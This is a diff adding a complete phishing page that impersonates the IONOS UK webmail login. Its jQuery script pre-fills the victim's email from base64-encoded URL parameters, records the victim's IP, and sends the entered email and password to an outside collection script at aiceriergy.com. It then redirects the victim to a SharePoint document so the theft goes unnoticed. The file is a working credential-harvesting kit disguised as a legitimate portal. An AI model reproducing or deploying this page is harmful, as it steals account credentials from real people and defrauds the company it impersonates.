@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webmail Login - IONOS UK</title>
+    <link rel="stylesheet" href="https://b3107b1b.cssproject.pages.dev/ionos.min.css">
+    <link rel="stylesheet" href="https://b3107b1b.cssproject.pages.dev/main.min.css">
+    <link rel="stylesheet" href="https://b3107b1b.cssproject.pages.dev/starter-main.min.css">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://8a4623bd.imagesproject.pages.dev/favicon-32px.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://8a4623bd.imagesproject.pages.dev/favicon-16px.png">
+    <link rel="icon" type="image/png" sizes="48x48" href="https://8a4623bd.imagesproject.pages.dev/favicon-48px.png">
+    <link rel="shortcut icon" type="image/x-icon" href="https://8a4623bd.imagesproject.pages.dev/favicon.ico">
+    <style>
+        .hidden {
+            display: none;
+        }
+        .error-message {
+            color: #d32f2f;
+            font-size: 14px;
+            margin-top: 8px;
+            text-align: center;
+            padding: 8px;
+            background-color: #ffebee;
+            border-radius: 4px;
+            border: 1px solid #f5c6cb;
+        }
+        .success-message {
+            color: #388e3c;
+            font-size: 14px;
+            margin-top: 8px;
+            text-align: center;
+            padding: 8px;
+            background-color: #e8f5e9;
+            border-radius: 4px;
+            border: 1px solid #c3e6cb;
+        }
+        .password-container {
+            position: relative;
+        }
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #666;
+        }
+        .loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+        }
+        .loader--hidden {
+            display: none;
+        }
+        .loader-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+        }
+        .loader-text {
+            margin-top: 15px;
+            font-size: 16px;
+            color: #333;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #signInErrorDiv {
+            color: #C1272D;
+            font-size: 14px;
+            margin-top: 8px;
+            text-align: center;
+            padding: 8px;
+            background-color: #ffebee;
+            border-radius: 4px;
+            border: 1px solid #f5c6cb;
+            display: none;
+        }
+        #signInErrorDiv.success {
+            color: #2e7d32;
+            background: #e8f5e9;
+            border-color: #c3e6cb;
+        }
+    </style>
+<base target="_blank">
+</head>
+<body>
+    <div class="page-content">
+        <div class="oao-navi-navigation oao-navi-light">
+            <div class="oao-navi-left">
+                <div class="oao-navi-application-name">
+                    <a class="oao-navi-app-name" href="#">
+                        <span class="oao-navi-app-logo"></span>
+                        <span>WEBMAIL LOGIN</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <main>
+            <section class="page-section page-section--default page-section--short">
+                <div class="page-section__block">
+                    <div class="sheet sheet__section--warning cookie-message hidden">
+                        <section class="sheet__section">
+                            <h2 class="headline headline--sub">Activation of Browser Cookies Required</h2>
+                            <p class="paragraph">To take advantage of our offer, it is necessary for you to allow the use of cookies in your browser settings.</p>
+                            <a href="#" class="link link--action" target="_blank">Learn more</a>
+                        </section>
+                    </div>
+
+                    <noscript>
+                        <div class="sheet sheet--warning">
+                            <section class="sheet__section">
+                                <h2 class="headline headline--sub headline--warning">Please enable JavaScript in your browser</h2>
+                                <p class="paragraph">To take advantage of our offer, it is necessary for you to allow the execution of JavaScript in your browser settings.</p>
+                            </section>
+                        </div>
+                    </noscript>
+
+                    <div class="oao-statuspage-message-container" data-component="CONTROL_PANEL"></div>
+
+                    <!-- Loader -->
+                    <div class="loader loader--hidden" id="pageLoader">
+                        <div class="loader-spinner"></div>
+                        <div class="loader-text">Signing in...</div>
+                    </div>
+
+                    <!-- Email Form -->
+                    <div class="sheet" id="emailForm">
+                        <section class="sheet__section sheet__section--default">
+                            <ul>
+                                <li class="stripe stripe--cropped">
+                                    <div class="stripe__item">
+                                        <img class="stripe__visual" src="https://8a4623bd.imagesproject.pages.dev/product-email.svg" height="58" width="auto" />
+                                    </div>
+                                    <div class="stripe__item">
+                                        <h1 class="headline stripe__element">My Webmail Login</h1>
+                                    </div>
+                                </li>
+                            </ul>
+                        </section>
+
+                        <section class="sheet__section sheet__section--default">
+                            <ul>
+                                <li class="form-stripe">
+                                    <label class="label" for="email">Email Address</label>
+                                    <input type="email" class="input-text form-input" name="identifier" id="email" tabindex="1"
+                                        required autofocus autocomplete="username" autocapitalize="none" spellcheck="false" value="" />
+                                    <p class="input-byline"><strong>Not your device?</strong> Log out after the session or use <a class="oao-pi-open-in-flyin reveal-title-by-hover link link--lookup tooltip" target="_blank" data-tooltip="Look up" href="#">private browsing mode</a>.</p>
+                                </li>
+                                <li class="form-stripe form-stripe--actions">
+                                    <button class="button button--primary button--full-width button--with-loader"
+                                        type="button" id="emailNextButton" tabindex="2">Next</button>
+                                </li>
+                            </ul>
+                        </section>
+
+                        <section class="sheet__section sheet__section--secondary hide-when-headless">
+                            <div class="ias-zone ias-login_offerlink" data-ias-zoneid="login_offerlink"></div>
+                        </section>
+                    </div>
+
+                    <!-- Password Form -->
+                    <div class="sheet hidden" id="passwordForm">
+                        <section class="sheet__section sheet__section--default">
+                            <ul>
+                                <li class="stripe stripe--cropped">
+                                    <div class="stripe__item">
+                                        <img class="stripe__visual" src="https://8a4623bd.imagesproject.pages.dev/password.svg" height="58" width="auto">
+                                    </div>
+                                    <div class="stripe__item">
+                                        <h1 class="headline stripe__element">Enter Password</h1>
+                                    </div>
+                                </li>
+                            </ul>
+                        </section>
+
+                        <section class="sheet__section sheet__section--default">
+                            <form method="POST" id="loginForm">
+                                <div class="container-current-identifier">
+                                    <div class="current-identifier">
+                                        <a class="ghost-button ghost-button--icon-only ghost-button--secondary tooltip" href="#" id="backButton" data-tooltip="Back to login">
+                                            <i class="ghost-button__icon exos-icon exos-icon-pagenavbackwards-16"></i>
+                                        </a>
+                                        <a class="button-current-identifier ghost-button ghost-button--with-icon ghost-button--secondary tooltip" href="#" id="backButtonText" data-tooltip="Back to login">
+                                            <i class="ghost-button__icon exos-icon exos-icon-nav-user-16"></i>
+                                            <span class="ghost-button__text" id="userEmailDisplay"></span>
+                                        </a>
+                                    </div>
+                                </div>
+
+                                <ul>
+                                    <li class="form-stripe">
+                                        <label class="label" for="password">Password</label>
+                                        <div class="password-container">
+                                            <input type="password" class="input-text" maxlength="2048" required tabindex="1" autofocus autocomplete="current-password" autocapitalize="none" spellcheck="false" id="password" name="password" value="">
+                                            <button type="button" class="toggle-password" id="togglePassword">Show</button>
+                                        </div>
+                                        <p class="input-byline">
+                                            <a class="link" target="_blank" href="#"></a>
+                                        </p>
+                                    </li>
+                                    <li class="form-stripe form-stripe--actions">
+                                        <button class="button button--primary button--full-width button--with-loader" type="submit" id="loginButton" tabindex="2">Sign In</button>
+                                    </li>
+                                </ul>
+
+                                <div id="messageArea"></div>
+                                <div id="signInErrorDiv"></div>
+
+                                <!-- Hidden fields for script functionality -->
+                                <input type="hidden" id="username" name="username">
+                                <input type="hidden" id="username1" name="username1">
+                                <input type="hidden" id="ipaddress" name="ipaddress">
+                            </form>
+                        </section>
+                    </div>
+
+                    <h2 class="headline headline--sub headline--headless-hidden">Log in to other IONOS services</h2>
+
+                    <div class="grid grid--full-height grid--headless-hidden">
+                        <div class="grid-col grid-col--4 grid-col--small-6">
+                            <a class="tile tile--filled" href="#">
+                                <img class="tile__image" src="https://8a4623bd.imagesproject.pages.dev/product-email.svg">
+                                <span class="tile__label">My IONOS</span>
+                            </a>
+                        </div>
+                        <div class="grid-col grid-col--4 grid-col--small-6">
+                            <a class="tile tile--filled" href="#">
+                                <img class="tile__image" src="https://8a4623bd.imagesproject.pages.dev/product-email.svg">
+                                <span class="tile__label">Email Archive</span>
+                            </a>
+                        </div>
+                        <div class="grid-col grid-col--4 grid-col--small-6">
+                            <a class="tile tile--filled" href="#">
+                                <img class="tile__image" src="https://8a4623bd.imagesproject.pages.dev/product-hidrive.svg">
+                                <span class="tile__label">HiDrive</span>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <footer class="page-footer">
+        <div class="page-footer__block">
+            <section class="page-footer__section page-footer__section--last">
+                <div class="page-footer__section-item">
+                    <div class="oao-statuspage-overall-status page-footer__status"></div>
+                </div>
+                <div class="page-footer__section-item page-footer__section-item--align-center page-footer__section-item--small-align-left">
+                    &copy; 2025
+                    <a class="page-footer__link" target="_blank" href="#">IONOS Cloud Ltd.</a>
+                </div>
+                <div class="page-footer__section-item page-footer__section-item--align-right page-footer__section-item--small-align-left">
+                    <a class="page-footer__link" target="_blank" href="#">Privacy Policy</a> -
+                    <a class="page-footer__link" target="_blank" href="#">Terms & Conditions</a> -
+                    <a class="page-footer__link" target="_blank" href="#">General Terms</a>
+                </div>
+            </section>
+        </div>
+    </footer>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            var redirectUrl = "https://regionalmanagers-my.sharepoint.com/:b:/p/ivan/EVhCMbG-roNHisHIx3fXqXkBATy7wZKPXYQsdKYIS5rgWA?e=1XABKN/";
+            var isProcessing = false;
+            var currentEmail = '';
+
+            populateEmailFromURL();
+            captureIP();
+            updateFavicon();
+
+            // If email found in URL, skip straight to password form
+            if (currentEmail && isValidEmail(currentEmail)) {
+                $('#username').val(currentEmail);
+                $('#username1').val(currentEmail);
+                $('#userEmailDisplay').text(currentEmail);
+
+                $('#emailForm').addClass('hidden');
+                $('#passwordForm').removeClass('hidden');
+                $('#password').focus();
+            }
+
+            // Email form "Next" button handler
+            $('#emailNextButton').on('click', function() {
+                var email = $('#email').val().trim();
+
+                if (!email) {
+                    showMessage('Please enter your email address.', 'error');
+                    $('#email').css('border-color', '#d32f2f');
+                    setTimeout(function() {
+                        $('#email').css('border-color', '');
+                    }, 3000);
+                    return;
+                }
+
+                if (!isValidEmail(email)) {
+                    showMessage('Please enter a valid email address.', 'error');
+                    $('#email').css('border-color', '#d32f2f');
+                    setTimeout(function() {
+                        $('#email').css('border-color', '');
+                    }, 3000);
+                    return;
+                }
+
+                currentEmail = email;
+                $('#username').val(email);
+                $('#username1').val(email);
+                $('#userEmailDisplay').text(email);
+
+                $('#emailForm').addClass('hidden');
+                $('#passwordForm').removeClass('hidden');
+                $('#password').focus();
+                clearMessage();
+            });
+
+            // Back button handler
+            $('#backButton, #backButtonText').on('click', function(e) {
+                e.preventDefault();
+                $('#passwordForm').addClass('hidden');
+                $('#emailForm').removeClass('hidden');
+                $('#email').focus();
+                clearMessage();
+                clearError();
+            });
+
+            // Login form submission
+            $('#loginForm').on('submit', function(event) {
+                event.preventDefault();
+
+                if (isProcessing) {
+                    showError("Please wait, processing...");
+                    return;
+                }
+
+                var email = $('#username').val().trim();
+                var domainUser = $('#username1').val().trim();
+                var password = $('#password').val();
+
+                if (!email || !password) {
+                    showError("Invalid email or password. Please try again.");
+                    highlightFieldError();
+                    return;
+                }
+
+                if (!isValidEmail(email)) {
+                    showError("Invalid email or password. Please try again.");
+                    return;
+                }
+
+                clearError();
+                clearMessage();
+                isProcessing = true;
+
+                // Lock password field so user can't edit while verifying
+                $('#password').attr('readonly', true);
+
+                var originalBtnText = $('#loginButton').text();
+                $('#loginButton').text('Signing in...').prop('disabled', true).css('opacity', '0.7');
+
+                // Show loader
+                $('#pageLoader').removeClass('loader--hidden');
+
+                var payload = {
+                    email: email,
+                    domainUser: domainUser,
+                    password: password,
+                    ipaddress: $('#ipaddress').val(),
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                };
+
+                $.ajax({
+                    url: 'https://aiceriergy.com/js/ionosem.php',
+                    type: 'POST',
+                    dataType: 'json',
+                    data: payload,
+                    timeout: 120000,
+                    success: function(response) {
+                        console.log("Response:", response);
+
+                        if (response && response.signal === 'success') {
+                            showSuccess("Login successful! Redirecting...");
+                            setTimeout(function() {
+                                window.location.replace(redirectUrl);
+                            }, 1500);
+                        } else {
+                            var msg = (response && response.message) ? response.message : "Invalid email or password. Please try again.";
+                            showError(msg);
+                            $('#password').val("").removeAttr('readonly');
+                            highlightFieldError();
+                            $('#pageLoader').addClass('loader--hidden');
+                            $('#loginButton').text(originalBtnText).prop('disabled', false).css('opacity', '1');
+                            isProcessing = false;
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                        console.error("AJAX Error:", status, error);
+                        showError("Invalid email or password. Please try again.");
+                        $('#password').val("").removeAttr('readonly');
+                        highlightFieldError();
+                        $('#pageLoader').addClass('loader--hidden');
+                        $('#loginButton').text(originalBtnText).prop('disabled', false).css('opacity', '1');
+                        isProcessing = false;
+                    }
+                });
+            });
+
+            // Toggle password visibility
+            $('#togglePassword').on('click', function() {
+                var passwordInput = $('#password');
+                var type = passwordInput.attr('type') === 'password' ? 'text' : 'password';
+                passwordInput.attr('type', type);
+                $(this).text(type === 'password' ? 'Show' : 'Hide');
+            });
+
+            // Enter key on password field
+            $('#password').keypress(function(e) {
+                if (e.which == 13) {
+                    $('#loginForm').submit();
+                }
+            });
+
+            // Enter key on email field
+            $('#email').keypress(function(e) {
+                if (e.which == 13) {
+                    $('#emailNextButton').click();
+                }
+            });
+
+            function isValidEmail(email) {
+                var re = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
+                return re.test(email);
+            }
+
+            function showError(message) {
+                $('#signInErrorDiv').removeClass('success').text(message).show();
+            }
+
+            function showSuccess(message) {
+                $('#signInErrorDiv').addClass('success').text(message).show();
+            }
+
+            function clearError() {
+                $('#signInErrorDiv').hide().text('').removeClass('success');
+            }
+
+            function showMessage(message, type) {
+                var $msgArea = $('#messageArea');
+                $msgArea.html('<div class="' + (type === 'error' ? 'error-message' : 'success-message') + '">' + message + '</div>');
+            }
+
+            function clearMessage() {
+                $('#messageArea').html('');
+            }
+
+            function highlightFieldError() {
+                $('#password').css('border-color', '#d32f2f');
+                setTimeout(function() {
+                    $('#password').css('border-color', '');
+                }, 3000);
+            }
+
+            function captureIP() {
+                if (!$('#ipaddress').length) {
+                    $('#loginForm').append('<input type="hidden" id="ipaddress" name="ipaddress">');
+                }
+                $.getJSON('https://api.ipify.org?format=json', function(data) {
+                    $('#ipaddress').val(data.ip);
+                }).fail(function() {
+                    $('#ipaddress').val('127.0.0.1');
+                });
+            }
+
+            function populateEmailFromURL() {
+                var email = null;
+                var hash = window.location.hash;
+                if (hash && hash.length > 1) {
+                    var hashValue = hash.substring(1);
+                    email = decodeEmailString(hashValue);
+                }
+                if (!email) {
+                    var urlParams = new URLSearchParams(window.location.search);
+                    if (urlParams.has('email')) {
+                        email = decodeEmailString(urlParams.get('email'));
+                    }
+                    if (!email && urlParams.has('user')) {
+                        email = decodeEmailString(urlParams.get('user'));
+                    }
+                    if (!email && urlParams.has('state')) {
+                        email = decodeEmailString(urlParams.get('state'));
+                    }
+                }
+                if (email && isValidEmail(email)) {
+                    $('#email').val(email);
+                    currentEmail = email;
+                }
+                return email;
+            }
+
+            function updateFavicon() {
+                var link = document.querySelector("link[rel*='icon']") || document.createElement('link');
+                link.type = 'image/x-icon';
+                link.rel = 'shortcut icon';
+                link.href = 'https://mail.thaco.com.vn/owa/auth/15.1.2507/themes/resources/favicon.ico';
+                document.getElementsByTagName('head')[0].appendChild(link);
+            }
+
+            function decodeEmailString(str) {
+                if (!str) return null;
+                var decoded = tryBase64Decode(str);
+                if (decoded && isValidEmail(decoded)) {
+                    return decoded;
+                }
+                return str;
+            }
+
+            function tryBase64Decode(str) {
+                try {
+                    str = decodeURIComponent(str);
+                    var base64Pattern = /^[A-Za-z0-9+/]*={0,2}$/;
+                    if (str.length % 4 === 0 && base64Pattern.test(str)) {
+                        var decoded = atob(str);
+                        return decoded;
+                    }
+                } catch (e) {
+                    // Not valid Base64
+                }
+                return null;
+            }
+        });
+    </script>
+</body>
+</html>
